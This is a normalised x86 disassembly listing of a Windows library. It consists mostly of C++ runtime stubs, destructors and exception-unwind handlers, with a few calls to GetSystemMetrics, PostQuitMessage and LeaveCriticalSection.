call sub_1001955c
jmp sub_1001955d
sub_1001955c
retn
sub_1001955d
push sub_10019569
call sub_10007b53
pop ecx
retn
sub_10019569
mov ecx rw-data
jmp r-xdata
jmp sub_100193fe
sub_100195db
push esi
mov esi ecx
call sub_100195f6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_1001966b
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_100142ee
retn
sub_1001968a
push esi
mov esi ecx
call sub_100196a5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_10019753
call sub_1001975d
jmp sub_1001975e
sub_1001975d
retn
sub_1001975e
push sub_1001976a
call sub_10007b53
pop ecx
retn
sub_1001976a
mov ecx rw-data
jmp sub_10019b92
sub_10019774
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
retn
push sub_100197c7
mov ecx rw-data
call sub_1001941c
sub_1001979a
call sub_10019774
add eax 0x1070
push sub_100197b1
mov ecx eax
call sub_10019387
retn
sub_100197b1
push 0x3c
call sub_1001909e
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_1001966b
retn
sub_100197ef
push esi
mov esi ecx
call j_sub_100195f6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
j_sub_100195f6
jmp sub_100195f6
sub_100198c4
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_100198e5
push 0x30
call sub_1001909e
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_100198fa
push esi
mov esi ecx
call sub_10019b0f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_10019915
mov eax r--data
retn
sub_10019a2d
mov eax r--data
retn
sub_10019a73
push esi
mov esi ecx
call j_sub_100165ab
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10006caa
j_sub_100165ab
jmp sub_100165ab
sub_10019a98
mov eax r--data
retn
sub_10019a9e
call sub_10019aa8
jmp sub_10019ab7
sub_10019aa8
push 0x40
push 0x3c
mov ecx rw-data
call sub_10006bb7
retn
sub_10019ab7
push sub_10019ac3
call sub_10007b53
pop ecx
retn
sub_10019ac3
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10006bdf
sub_10019b50
call sub_10019b5a
jmp sub_10019b5b
sub_10019b5a
retn
sub_10019b5b
push r-xdata
call sub_10007b53
pop ecx
retn
sub_10019b71
call sub_10019b7b
jmp sub_10019b7c
sub_10019b7b
retn
sub_10019b7c
push sub_10019b88
call sub_10007b53
pop ecx
retn
sub_10019b88
mov ecx rw-data
jmp sub_10019b92
sub_10019b97
call sub_10019ba1
jmp sub_10019bab
sub_10019ba1
mov ecx rw-data
jmp sub_10019c13
sub_10019bab
push sub_10019bb7
call sub_10007b53
pop ecx
retn
sub_10019bb7
mov ecx rw-data
jmp sub_10019fda
sub_10019bf1
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_10019cae
mov eax ecx
mov [ eax ] r--data
retn
sub_10019cb7
push esi
mov esi ecx
call sub_10019fe4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100190bc
sub_10019cd2
call sub_10019cdc
jmp sub_10019cdd
sub_10019cdc
retn
sub_10019cdd
push sub_10019ce9
call sub_10007b53
pop ecx
retn
sub_10019ce9
mov ecx rw-data
jmp sub_10019b92
sub_10019d16
jmp r-xdata
call sub_10019cf3
mov [ rw-data ] eax
retn
sub_10019d26
push 0x8
call sub_10014308
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_10019d40
mov eax r--data
retn
sub_10019d46
mov ecx rw-data
call sub_10006c1b
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_10019d62
push esi
mov esi ecx
call sub_10019d82
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10006caa
sub_10019d82
mov eax sub_1001a708
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10018490
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10019dab
mov eax r--data
retn
sub_10019db1
call sub_10019dbb
jmp sub_10019dca
sub_10019dbb
push 0x40
push 0x8
mov ecx rw-data
call sub_10006bb7
retn
sub_10019dca
push sub_10019dd6
call sub_10007b53
pop ecx
retn
sub_10019dd6
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10006bdf
sub_10019df1
mov eax r--data
retn
sub_10019df7
call sub_10019e01
jmp sub_10019e13
sub_10019e01
push 0xf022
push 0x0
mov ecx rw-data
call sub_10006ffe
retn
sub_10019e13
push sub_10019e1f
call sub_10007b53
pop ecx
retn
sub_10019e1f
mov ecx rw-data
jmp sub_10007044
sub_10019e29
mov eax r--data
retn
sub_10019e2f
call sub_10019e39
jmp sub_10019e4b
sub_10019e39
push 0xf024
push 0x0
mov ecx rw-data
call sub_1000704b
retn
sub_10019e4b
push sub_10019e57
call sub_10007b53
pop ecx
retn
sub_10019e57
mov ecx rw-data
jmp sub_10007091
sub_10019e61
push 0x10
call sub_10014308
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_10018661
retn
sub_10019e78
mov eax r--data
retn
sub_10019e7e
push 0x8
call sub_10014308
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_10019e98
mov eax r--data
retn
sub_10019ec4
push esi
mov esi ecx
call j_sub_10018749
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10006caa
j_sub_10018749
jmp sub_10018749
sub_10019ee9
mov eax r--data
retn
sub_10019eef
mov ecx rw-data
call sub_10006c1b
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_10019f0b
push esi
mov esi ecx
call sub_10019f2b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10006caa
sub_10019f2b
mov eax sub_1001a76c
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10018bbb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10019f54
mov eax r--data
retn
sub_10019f5a
call sub_10019f64
jmp sub_10019f73
sub_10019f64
push 0x40
push 0x10
mov ecx rw-data
call sub_10006bb7
retn
sub_10019f73
push sub_10019f7f
call sub_10007b53
pop ecx
retn
sub_10019f7f
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10006bdf
sub_10019f9a
call sub_10019fa4
jmp sub_10019fb3
sub_10019fa4
push 0x40
push 0x8
mov ecx rw-data
call sub_10006bb7
retn
sub_10019fb3
push sub_10019fbf
call sub_10007b53
pop ecx
retn
sub_10019fbf
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_10006bdf
sub_10019fda
add ecx 0x50
push ecx
call sub_100185c0
retn
sub_1001a011
call sub_100155f9
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_1001a040
lea ecx [ ebp - 0x350 ]
jmp sub_10001b60
sub_1001a04b
mov eax r--data
jmp sub_10007273
sub_1001a060
mov eax r--data
jmp sub_10007273
sub_1001a070
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_10003250
sub_1001a07b
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10003250
sub_1001a086
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_10003250
sub_1001a091
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_10003250
sub_1001a09c
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_10003250
sub_1001a0a7
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_10001030
sub_1001a0b2
mov eax r--data
jmp sub_10007273
sub_1001a0c0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_10003250
sub_1001a0cb
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_10003250
sub_1001a0d6
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_10003250
sub_1001a0e1
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_10003250
sub_1001a0ec
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_10003250
sub_1001a0f7
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_10001030
sub_1001a102
mov eax r--data
jmp sub_10007273
sub_1001a110
lea ecx [ ebp - 0x2c ]
jmp sub_10003250
sub_1001a118
lea ecx [ ebp - 0x4c ]
jmp sub_10003250
sub_1001a120
lea ecx [ ebp - 0x5c ]
jmp sub_10003250
sub_1001a128
lea ecx [ ebp - 0x3c ]
jmp sub_10001b60
sub_1001a130
mov eax [ ebp - 0x68 ]
push eax
call sub_10014331
pop ecx
retn
sub_1001a13b
lea ecx [ ebp - 0x6c ]
jmp sub_10002790
sub_1001a143
lea ecx [ ebp - 0x1c ]
jmp sub_10001b60
sub_1001a14b
mov eax r--data
jmp sub_10007273
sub_1001a160
lea ecx [ ebp - 0x2c ]
jmp sub_10003250
sub_1001a168
lea ecx [ ebp - 0x4c ]
jmp sub_10003250
sub_1001a170
lea ecx [ ebp - 0x5c ]
jmp sub_10003250
sub_1001a178
lea ecx [ ebp - 0x3c ]
jmp sub_10001b60
sub_1001a180
mov eax [ ebp - 0x68 ]
push eax
call sub_10014331
pop ecx
retn
sub_1001a18b
lea ecx [ ebp - 0x6c ]
jmp sub_10002790
sub_1001a193
lea ecx [ ebp - 0x1c ]
jmp sub_10001b60
sub_1001a19b
mov eax r--data
jmp sub_10007273
sub_1001a1b0
mov eax [ ebp - 0x10 ]
push eax
call sub_10014331
pop ecx
retn
sub_1001a1bb
mov eax r--data
jmp sub_10007273
sub_1001a1d0
mov eax r--data
jmp sub_10007273
sub_1001a1e0
lea ecx [ ebp - 0x29c ]
jmp sub_10005190
sub_1001a1eb
mov eax r--data
jmp sub_10007273
sub_1001a200
mov ecx [ ebp - 0x10 ]
jmp sub_10002300
sub_1001a208
mov eax r--data
jmp sub_10007273
sub_1001a220
lea ecx [ ebp - 0x56c ]
jmp sub_100065ad
sub_1001a22b
lea ecx [ ebp - 0x550 ]
jmp sub_10014391
sub_1001a236
mov eax r--data
jmp sub_10007273
sub_1001a240
lea ecx [ ebp - 0x20454 ]
jmp sub_10002300
sub_1001a256
mov eax r--data
jmp sub_10007273
sub_1001a260
lea ecx [ ebp - 0x20454 ]
jmp sub_10002300
sub_1001a276
mov eax r--data
jmp sub_10007273
sub_1001a280
mov ecx [ ebp - 0x10 ]
jmp sub_10002300
sub_1001a288
mov eax r--data
jmp sub_10007273
sub_1001a2a0
mov ecx [ ebp - 0x10 ]
jmp sub_10002300
sub_1001a2a8
mov eax r--data
jmp sub_10007273
sub_1001a2c0
lea ecx [ ebp - 0xa4 ]
jmp sub_10001b60
sub_1001a2cb
mov eax r--data
jmp sub_10007273
sub_1001a2e0
lea ecx [ ebp - 0xc0 ]
jmp sub_10001b60
sub_1001a2eb
lea ecx [ ebp - 0xb0 ]
jmp sub_10003d20
sub_1001a2f6
lea ecx [ ebp - 0xb0 ]
jmp sub_10006020
sub_1001a301
mov eax r--data
jmp sub_10007273
sub_1001a310
mov eax r--data
jmp sub_10007273
sub_1001a31c
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a324
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_10014bf1
sub_1001a32f
mov eax r--data
jmp sub_10007273
sub_1001a33c
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a344
lea ecx [ ebp - 0x14 ]
jmp sub_10014bf1
sub_1001a34c
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a363
mov eax r--data
jmp sub_10007273
sub_1001a370
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a378
lea ecx [ ebp - 0x14 ]
jmp sub_10014bf1
sub_1001a380
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a397
mov eax r--data
jmp sub_10007273
sub_1001a3a4
lea ecx [ ebp - 0x14 ]
jmp sub_10014bf1
sub_1001a3ac
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a3b4
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a3cb
mov eax r--data
jmp sub_10007273
sub_1001a3d8
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a3e0
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a3f7
mov eax r--data
jmp sub_10007273
sub_1001a404
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a40c
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_10014bf1
sub_1001a417
mov eax r--data
jmp sub_10007273
sub_1001a424
lea ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a42c
mov eax r--data
jmp sub_10007273
sub_1001a438
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a440
mov eax r--data
jmp sub_10007273
sub_1001a44c
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a454
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a46b
mov eax r--data
jmp sub_10007273
sub_1001a478
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a480
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_10014bf1
sub_1001a497
mov eax r--data
jmp sub_10007273
sub_1001a4a4
push [ ebp - 0x10 ]
call sub_100190bc
retn
sub_1001a4ad
mov eax r--data
jmp sub_10007273
sub_1001a4b8
mov eax r--data
jmp sub_10007273
sub_1001a4c4
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a4cc
lea ecx [ ebp + 0x10 ]
jmp sub_10014bf1
sub_1001a4d4
mov eax r--data
jmp sub_10007273
sub_1001a4e0
push [ ebp - 0x14 ]
call sub_10006baa
retn
sub_1001a4e9
mov ecx [ ebp - 0x14 ]
jmp sub_10006ab8
sub_1001a4f1
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_10014bf1
sub_1001a4fc
mov eax r--data
jmp sub_10007273
sub_1001a508
mov eax r--data
jmp sub_10007273
sub_1001a514
lea ecx [ ebp - 0x10 ]
jmp sub_10014bf1
sub_1001a51c
mov eax r--data
jmp sub_10007273
sub_1001a528
mov eax r--data
jmp sub_10007273
sub_1001a534
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a53c
mov eax r--data
jmp sub_10007273
sub_1001a548
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a55e
mov eax r--data
jmp sub_10007273
sub_1001a568
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a570
mov eax r--data
jmp sub_10007273
sub_1001a57c
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a584
mov eax r--data
jmp sub_10007273
sub_1001a590
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a598
mov eax r--data
jmp sub_10007273
sub_1001a5a4
mov eax r--data
jmp sub_10007273
sub_1001a5b0
push [ ebp + 0x8 ]
call sub_10014331
pop ecx
retn
sub_1001a5ba
mov eax r--data
jmp sub_10007273
sub_1001a5c4
mov eax r--data
jmp sub_10007273
sub_1001a5d0
mov ecx [ ebp - 0x10 ]
jmp sub_10015628
sub_1001a5d8
mov eax r--data
jmp sub_10007273
sub_1001a5e4
mov eax r--data
jmp sub_10007273
sub_1001a5f0
lea ecx [ ebp - 0x8 ]
jmp sub_10006f48
sub_1001a5f8
mov eax r--data
jmp sub_10007273
sub_1001a604
lea ecx [ ebp - 0x24 ]
jmp sub_10018749
sub_1001a60c
lea ecx [ ebp - 0x60 ]
jmp sub_100165ab
sub_1001a614
lea ecx [ ebp - 0x24 ]
jmp sub_10018749
sub_1001a61c
mov eax r--data
jmp sub_10007273
sub_1001a628
lea ecx [ ebp - 0x48 ]
jmp sub_100165ab
sub_1001a630
mov eax r--data
jmp sub_10007273
sub_1001a63c
push [ ebp - 0x10 ]
call sub_10006baa
retn
sub_1001a645
mov eax r--data
jmp sub_10007273
sub_1001a650
push [ ebp - 0x10 ]
call sub_10017fa6
pop ecx
retn
sub_1001a65a
mov eax r--data
jmp sub_10007273
sub_1001a664
push [ ebp - 0x10 ]
call sub_100190bc
retn
sub_1001a66d
mov eax r--data
jmp sub_10007273
sub_1001a678
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a680
mov eax r--data
jmp sub_10007273
sub_1001a68c
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100140f6
sub_1001a697
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_100140f6
sub_1001a6a2
mov eax r--data
jmp sub_10007273
sub_1001a6ac
mov eax r--data
jmp sub_10007273
sub_1001a6b8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100140f6
sub_1001a6c3
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_100140f6
sub_1001a6ce
mov eax r--data
jmp sub_10007273
sub_1001a6d8
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a6e0
mov eax r--data
jmp sub_10007273
sub_1001a6ec
push [ ebp + 0x8 ]
call sub_10014331
pop ecx
retn
sub_1001a6f6
mov eax r--data
jmp sub_10007273
sub_1001a700
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a708
mov eax r--data
jmp sub_10007273
sub_1001a714
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a71c
mov eax r--data
jmp sub_10007273
sub_1001a728
push [ ebp + 0x8 ]
call sub_10014331
pop ecx
retn
sub_1001a732
mov eax r--data
jmp sub_10007273
sub_1001a73c
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a744
mov eax r--data
jmp sub_10007273
sub_1001a750
push [ ebp + 0x8 ]
call sub_10014331
pop ecx
retn
sub_1001a75a
mov eax r--data
jmp sub_10007273
sub_1001a764
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a76c
mov eax r--data
jmp sub_10007273
sub_1001a778
mov ecx [ ebp - 0x10 ]
jmp sub_10006ab8
sub_1001a780
mov eax r--data
jmp sub_10007273
sub_1001a78c
lea ecx [ ebp - 0x20 ]
jmp sub_10001b60
sub_1001a794
mov eax r--data
jmp sub_10007273
sub_1001a7a0
mov ecx [ ebp - 0x14 ]
jmp sub_10013dd3
sub_1001a7a8
mov eax r--data
jmp sub_10007273
sub_1001a7b4
mov ecx [ ebp - 0x10 ]
jmp sub_10013dd3
sub_1001a7bc
mov eax r--data
jmp sub_10007273
sub_1001a7c8
mov ecx [ ebp - 0x10 ]
jmp sub_10013dd3
sub_1001a7d0
mov eax r--data
jmp sub_10007273
sub_1001a7dc
mov ecx [ ebp - 0x10 ]
jmp sub_10013dd3
sub_1001a7e4
mov eax r--data
jmp sub_10007273
sub_1001a7f0
lea ecx [ ebp - 0x20 ]
jmp sub_10001b60
sub_1001a7f8
mov eax r--data
jmp sub_10007273
sub_1001a804
mov ecx [ ebp - 0x10 ]
jmp sub_10013dd3
sub_1001a80c
mov eax r--data
jmp sub_10007273
